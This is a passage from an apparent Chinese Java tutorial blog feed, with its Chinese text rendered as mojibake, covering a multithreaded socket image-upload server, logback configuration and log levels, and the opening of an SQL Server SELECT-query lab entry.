bos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é€šè¿‡ç½‘ç»œå†™åˆ°æœåŠ¡å™¨ä¸­</span>        <span class="token punctuation">}</span>        bos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//ç»™æœåŠ¡å™¨ä¸€ä¸ªç»“æŸæ ‡è®°,å‘Šè¯‰æœåŠ¡å™¨æ–‡ä»¶å·²ç»ä¼ è¾“å®Œæ¯•</span>        socket<span class="token punctuation">.</span><span class="token function">shutdownOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BufferedReader</span> br <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> line<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line <span class="token operator">=</span> br<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        bis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        socket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çº¿ç¨‹ä»»åŠ¡ç±»</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadSocket</span> <span class="token keyword">implements</span> <span class="token class-name">Runnable</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">Socket</span> acceptSocket<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">ThreadSocket</span><span class="token punctuation">(</span><span class="token class-name">Socket</span> accept<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>acceptSocket <span class="token operator">=</span> accept<span class="token punctuation">;</span>    <span class="token punctuation">}</span>      <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">BufferedOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment">//ç½‘ç»œä¸­çš„æµ,ä»å®¢æˆ·ç«¯è¯»å–æ•°æ®çš„</span>            <span class="token class-name">BufferedInputStream</span> bis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedInputStream</span><span class="token punctuation">(</span>acceptSocket<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//æœ¬åœ°çš„IOæµ,æŠŠæ•°æ®å†™åˆ°æœ¬åœ°ä¸­,å®ç°æ°¸ä¹…åŒ–å­˜å‚¨</span>            bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"server\\ServerDir\\"</span> <span class="token operator">+</span> UUID<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".jpg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> b<span class="token punctuation">;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">=</span> bis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                bos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>                      <span class="token class-name">BufferedWriter</span> bw <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedWriter</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">OutputStreamWriter</span><span class="token punctuation">(</span>acceptSocket<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bw<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">"ä¸Šä¼ æˆåŠŸ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bw<span class="token punctuation">.</span><span class="token function">newLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            bw<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>bos <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    bos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>acceptSocket <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    acceptSocket<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong></p><ol><li><p>ä½¿ç”¨å¾ªç¯å¯ä»¥å¤šæ¬¡ä¸Šä¼ å›¾ç‰‡</p></li><li><p>UUID. randomUUID()æ–¹æ³•ç”Ÿæˆéšæœºçš„æ–‡ä»¶åï¼Œé˜²æ­¢æ–‡ä»¶è¢«è¦†ç›–ã€‚</p></li><li><p>åŠ å…¥çº¿ç¨‹æ± ï¼Œå‡å°èµ„æºæ¶ˆè€—ï¼Œè¿˜å¯ä»¥åŒæ—¶è·Ÿå¤šä¸ªå®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ã€‚</p></li></ol><h2 id="æ—¥å¿—"><a href="#æ—¥å¿—" class="headerlink" title="æ—¥å¿—"></a>æ—¥å¿—</h2><ul><li><p>ç¨‹åºä¸­çš„æ—¥å¿—å¯ä»¥ç”¨æ¥è®°å½•ç¨‹åºåœ¨è¿è¡Œçš„æ—¶å€™ç‚¹ç‚¹æ»´æ»´ã€‚å¹¶å¯ä»¥è¿›è¡Œæ°¸ä¹…å­˜å‚¨ã€‚</p></li><li><p>æ—¥å¿—ä¸è¾“å‡ºè¯­å¥çš„åŒºåˆ«</p><table><thead><tr><th></th><th>è¾“å‡ºè¯­å¥</th><th>æ—¥å¿—æŠ€æœ¯</th></tr></thead><tbody><tr><td>å–æ¶ˆæ—¥å¿—</td><td>éœ€è¦ä¿®æ”¹ä»£ç ï¼Œçµæ´»æ€§æ¯”è¾ƒå·®</td><td>ä¸éœ€è¦ä¿®æ”¹ä»£ç ï¼Œçµæ´»æ€§æ¯”è¾ƒå¥½</td></tr><tr><td>è¾“å‡ºä½ç½®</td><td>åªèƒ½æ˜¯æ§åˆ¶å°</td><td>å¯ä»¥å°†æ—¥å¿—ä¿¡æ¯å†™å…¥åˆ°æ–‡ä»¶æˆ–è€…æ•°æ®åº“ä¸­</td></tr><tr><td>å¤šçº¿ç¨‹</td><td>å’Œä¸šåŠ¡ä»£ç å¤„äºä¸€ä¸ªçº¿ç¨‹ä¸­</td><td>å¤šçº¿ç¨‹æ–¹å¼è®°å½•æ—¥å¿—ï¼Œä¸å½±å“ä¸šåŠ¡ä»£ç çš„æ€§èƒ½</td></tr></tbody></table></li></ul><ul><li><p>ä½“ç³»ç»“æ„</p><img src="09_æ—¥å¿—çš„ä½“ç³»ç»“æ„.png" alt="æ—¥å¿—çš„ä½“ç³»ç»“æ„" style="zoom:80%;"></li><li><p>logbackæ—¥å¿—ï¼š</p><blockquote><p>é€šè¿‡ä½¿ç”¨logbackï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯è¾“é€çš„ç›®çš„åœ°æ˜¯æ§åˆ¶å°ã€æ–‡ä»¶ç­‰ä½ç½®ã€‚</p><p>å¯ä»¥æ§åˆ¶æ¯ä¸€æ¡æ—¥å¿—çš„è¾“å‡ºæ ¼å¼ã€‚</p><p>é€šè¿‡å®šä¹‰æ¯ä¸€æ¡æ—¥å¿—ä¿¡æ¯çš„çº§åˆ«ï¼Œæˆ‘ä»¬èƒ½å¤Ÿæ›´åŠ ç»†è‡´åœ°æ§åˆ¶æ—¥å¿—çš„ç”Ÿæˆè¿‡ç¨‹ã€‚</p><p>å¯ä»¥é€šè¿‡ä¸€ä¸ªé…ç½®æ–‡ä»¶æ¥çµæ´»åœ°è¿›è¡Œé…ç½®ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹åº”ç”¨çš„ä»£ç ã€‚</p></blockquote></li><li><p>Logbackä¸‰ä¸ªæŠ€æœ¯æ¨¡å—ï¼š</p><ol><li>logback-coreï¼šä¸ºå…¶ä»–ä¸¤ä¸ªæ¨¡å—æä¾›ä»£ç åŸºç¡€</li><li>logback-classicï¼šå®Œæ•´å®ç°äº†slf4j APIçš„æ¨¡å—</li><li>logback-accessï¼šæ¨¡å—ä¸Tomcatå’ŒJettyç­‰servletå®¹å™¨ç»§æ‰¿ï¼Œä»¥æä¾›Httpè®¿é—®æ—¥å¿—çš„åŠŸèƒ½</li></ol></li></ul><h4 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h4><ul><li><p>å¯¼å…¥jaråŒ…ï¼š</p><p>æ–°å»ºlibæ–‡ä»¶å¤¹ï¼Œå°†jaråŒ…ç²˜è´´è¿›å»ï¼Œä½œä¸ºåº“</p><img src="image-20220402182911817.png" style="zoom:80%;"></li><li><p>ç¼–å†™logbacké…ç½®æ–‡ä»¶ï¼Œç²˜è´´åˆ°srcæ–‡ä»¶å¤¹ä¸‹</p></li></ul><p>logback.xmlï¼š</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--        CONSOLE ï¼šè¡¨ç¤ºå½“å‰çš„æ—¥å¿—ä¿¡æ¯æ˜¯å¯ä»¥è¾“å‡ºåˆ°æ§åˆ¶å°çš„ã€‚    --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>CONSOLE<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.ConsoleAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--è¾“å‡ºæµå¯¹è±¡ é»˜è®¤ System.out æ”¹ä¸º System.err--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>target</span><span class="token punctuation">&gt;</span></span>System.out<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>target</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span>            <span class="token comment">&lt;!--æ ¼å¼åŒ–è¾“å‡ºï¼š%dè¡¨ç¤ºæ—¥æœŸï¼Œ%threadè¡¨ç¤ºçº¿ç¨‹åï¼Œ%-5levelï¼šçº§åˆ«ä»å·¦æ˜¾ç¤º5ä¸ªå­—ç¬¦å®½åº¦                %msgï¼šæ—¥å¿—æ¶ˆæ¯ï¼Œ%næ˜¯æ¢è¡Œç¬¦--&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd HH:mm:ss.SSS} [%-5level]  %c [%thread] : %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!-- Fileæ˜¯è¾“å‡ºçš„æ–¹å‘é€šå‘æ–‡ä»¶çš„ --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>FILE<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.RollingFileAppender<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">&gt;</span></span>%d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>charset</span><span class="token punctuation">&gt;</span></span>utf-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>charset</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--æ—¥å¿—è¾“å‡ºè·¯å¾„--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">&gt;</span></span>E:/Javalearning/yang.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>file</span><span class="token punctuation">&gt;</span></span>        <span class="token comment">&lt;!--æŒ‡å®šæ—¥å¿—æ–‡ä»¶æ‹†åˆ†å’Œå‹ç¼©è§„åˆ™--&gt;</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rollingPolicy</span>                <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.SizeAndTimeBasedRollingPolicy<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token comment">&lt;!--é€šè¿‡æŒ‡å®šå‹ç¼©æ–‡ä»¶åç§°ï¼Œæ¥ç¡®å®šåˆ†å‰²æ–‡ä»¶æ–¹å¼--&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>C:/code/itheima-data2-%d{yyyy-MMdd}.log%i.gz<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fileNamePattern</span><span class="token punctuation">&gt;</span></span>            <span class="token comment">&lt;!--æ–‡ä»¶æ‹†åˆ†å¤§å°--&gt;</span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maxFileSize</span><span class="token punctuation">&gt;</span></span>1MB<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maxFileSize</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rollingPolicy</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--    level:ç”¨æ¥è®¾ç½®æ‰“å°çº§åˆ«ï¼Œå¤§å°å†™æ— å…³ï¼šTRACE, DEBUG, INFO, WARN, ERROR, ALL å’Œ OFF   ï¼Œ é»˜è®¤debug    &lt;root&gt;å¯ä»¥åŒ…å«é›¶ä¸ªæˆ–å¤šä¸ª&lt;appender-ref&gt;å…ƒç´ ï¼Œæ ‡è¯†è¿™ä¸ªè¾“å‡ºä½ç½®å°†ä¼šè¢«æœ¬æ—¥å¿—çº§åˆ«æ§åˆ¶ã€‚    --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>DEBUG<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>CONSOLE<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>FILE<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>åœ¨ä»£ç ä¸­è·å–æ—¥å¿—çš„å¯¹è±¡</p></li><li><p>æŒ‰ç…§çº§åˆ«è®¾ç½®è®°å½•æ—¥å¿—ä¿¡æ¯</p></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test01</span> <span class="token punctuation">{</span>    <span class="token comment">//è·å–æ—¥å¿—çš„å¯¹è±¡</span>    <span class="token keyword">private</span> <span class="token keyword">static</span>  <span class="token keyword">final</span> <span class="token class-name">Logger</span> LOGGER <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">Test01</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//3.åœ¨ä»£ç ä¸­è·å–æ—¥å¿—çš„å¯¹è±¡</span>        <span class="token comment">//4.æŒ‰ç…§æ—¥å¿—çº§åˆ«è®¾ç½®æ—¥å¿—ä¿¡æ¯</span>        LOGGER<span class="token punctuation">.</span><span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">"debugçº§åˆ«çš„æ—¥å¿—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        LOGGER<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"infoçº§åˆ«çš„æ—¥å¿—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        LOGGER<span class="token punctuation">.</span><span class="token function">warn</span><span class="token punctuation">(</span><span class="token string">"warnçº§åˆ«çš„æ—¥å¿—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        LOGGER<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"errorçº§åˆ«çš„æ—¥å¿—"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ—¥å¿—è¾“å‡ºçš„æ–‡ä»¶è·¯å¾„åœ¨xmlé…ç½®æ–‡ä»¶ä¸­å®šä¹‰</p><img src="image-20220402183413899.png"></blockquote><ul><li><p>æ—¥å¿—çš„å…­ç§çº§åˆ«ï¼š</p><blockquote><p><strong>ã€ŒTRACEã€</strong> : designates finer-grained informational events than the DEBUG.Since:1.2.12ï¼Œå¾ˆä½çš„æ—¥å¿—çº§åˆ«ï¼Œä¸€èˆ¬ä¸ä¼šä½¿ç”¨ã€‚</p><p><strong>ã€ŒDEBUGã€</strong>:  æŒ‡å‡ºç»†ç²’åº¦ä¿¡æ¯äº‹ä»¶å¯¹è°ƒè¯•åº”ç”¨ç¨‹åºæ˜¯éå¸¸æœ‰å¸®åŠ©çš„ï¼Œä¸»è¦ç”¨äºå¼€å‘è¿‡ç¨‹ä¸­æ‰“å°ä¸€äº›è¿è¡Œä¿¡æ¯ã€‚</p><p><strong>ã€ŒINFOã€</strong>: æ¶ˆæ¯åœ¨ç²—ç²’åº¦çº§åˆ«ä¸Šçªå‡ºå¼ºè°ƒåº”ç”¨ç¨‹åºçš„è¿è¡Œè¿‡ç¨‹ã€‚æ‰“å°ä¸€äº›ä½ æ„Ÿå…´è¶£çš„æˆ–è€…é‡è¦çš„ä¿¡æ¯ï¼Œè¿™ä¸ªå¯ä»¥ç”¨äºç”Ÿäº§ç¯å¢ƒä¸­è¾“å‡ºç¨‹åºè¿è¡Œçš„ä¸€äº›é‡è¦      ä¿¡æ¯ï¼Œä½†æ˜¯ä¸èƒ½æ»¥ç”¨ï¼Œé¿å…æ‰“å°è¿‡å¤šçš„æ—¥å¿—ã€‚</p><p><strong>ã€ŒWARNã€</strong>: è¡¨æ˜ä¼šå‡ºç°æ½œåœ¨é”™è¯¯çš„æƒ…å½¢ï¼Œæœ‰äº›ä¿¡æ¯ä¸æ˜¯é”™è¯¯ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿè¦ç»™ç¨‹åºå‘˜çš„ä¸€äº›æç¤ºã€‚</p><p><strong>ã€ŒERRORã€</strong>: æŒ‡å‡ºè™½ç„¶å‘ç”Ÿé”™è¯¯äº‹ä»¶ï¼Œä½†ä»ç„¶ä¸å½±å“ç³»ç»Ÿçš„ç»§ç»­è¿è¡Œã€‚æ‰“å°é”™è¯¯å’Œå¼‚å¸¸ä¿¡æ¯ï¼Œå¦‚æœä¸æƒ³è¾“å‡ºå¤ªå¤šçš„æ—¥å¿—ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªçº§åˆ«ã€‚</p><p><strong>ã€ŒFATALã€</strong>: æŒ‡å‡ºæ¯ä¸ªä¸¥é‡çš„é”™è¯¯äº‹ä»¶å°†ä¼šå¯¼è‡´åº”ç”¨ç¨‹åºçš„é€€å‡ºã€‚è¿™ä¸ªçº§åˆ«æ¯”è¾ƒé«˜äº†ã€‚é‡å¤§é”™è¯¯ï¼Œè¿™ç§çº§åˆ«ä½ å¯ä»¥ç›´æ¥åœæ­¢ç¨‹åºäº†ã€‚</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JavaSE </tag>
            
            <tag> Javaç½‘ç»œç¼–ç¨‹ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLè¯­è¨€â€”SELECTæŸ¥è¯¢æ“ä½œ</title>
      <link href="/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/"/>
      <url>/2022/04/02/sql-yu-yan-select-cha-xun-cao-zuo/</url>
      
        <content type="html"><![CDATA[<h2 id="å®éªŒ2-SQL-è¯­è¨€â€”SELECTæŸ¥è¯¢æ“ä½œ"><a href="#å®éªŒ2-SQL-è¯­è¨€â€”SELECTæŸ¥è¯¢æ“ä½œ" class="headerlink" title="å®éªŒ2    SQL è¯­è¨€â€”SELECTæŸ¥è¯¢æ“ä½œ"></a>å®éªŒ2    SQL è¯­è¨€â€”SELECTæŸ¥è¯¢æ“ä½œ</h2><h4 id="å®éªŒç›®çš„è¦æ±‚"><a href="#å®éªŒç›®çš„è¦æ±‚" class="headerlink" title="å®éªŒç›®çš„è¦æ±‚"></a>å®éªŒç›®çš„è¦æ±‚</h4><ol><li>æŒæ¡ SQL ç¨‹åºè®¾è®¡åŸºæœ¬è§„èŒƒï¼Œç†Ÿç»ƒè¿ç”¨ SQL è¯­è¨€å®ç°æ•°æ®åŸºæœ¬æŸ¥è¯¢ï¼ŒåŒ…æ‹¬å•</li></ol><p>è¡¨æŸ¥è¯¢ã€åˆ†ç»„ç»Ÿè®¡æŸ¥è¯¢å’Œè¿æ¥æŸ¥è¯¢ã€‚</p><ol start="2"><li>æŒæ¡ SQL åµŒå¥—æŸ¥è¯¢å’Œé›†åˆæŸ¥è¯¢ç­‰å„ç§é«˜çº§æŸ¥è¯¢çš„è®¾è®¡æ–¹æ³•ç­‰ã€‚</li></ol><h4 id="å®éªŒä¸»è¦å†…å®¹"><a href="#å®éªŒä¸»è¦å†…å®¹" class="headerlink" title="å®éªŒä¸»è¦å†…å®¹"></a>å®éªŒä¸»è¦å†…å®¹</h4><ol><li><p>é’ˆå¯¹ SQL Server æ•°æ®åº“è®¾è®¡å„ç§å•è¡¨æŸ¥è¯¢è¯­å¥ã€åˆ†ç»„ç»Ÿè®¡æŸ¥è¯¢è¯­å¥ï¼›è®¾è®¡å•</p><p>ä¸ªè¡¨é’ˆå¯¹è‡ªèº«çš„è¿æ¥æŸ¥è¯¢ï¼Œè®¾è®¡å¤šä¸ªè¡¨çš„è¿æ¥æŸ¥è¯¢ã€‚ç†è§£å’ŒæŒæ¡ SQL æŸ¥è¯¢è¯­</p><p>å¥å„ä¸ªå­å¥çš„ç‰¹ç‚¹å’Œä½œç”¨ï¼ŒæŒ‰ç…§ SQL ç¨‹åºè®¾è®¡è§„èŒƒå†™å‡ºå…·ä½“çš„ SQL æŸ¥è¯¢è¯­å¥ï¼Œå¹¶è°ƒè¯•é€šè¿‡ã€‚</p></li><li><p>é’ˆå¯¹ SQL Server 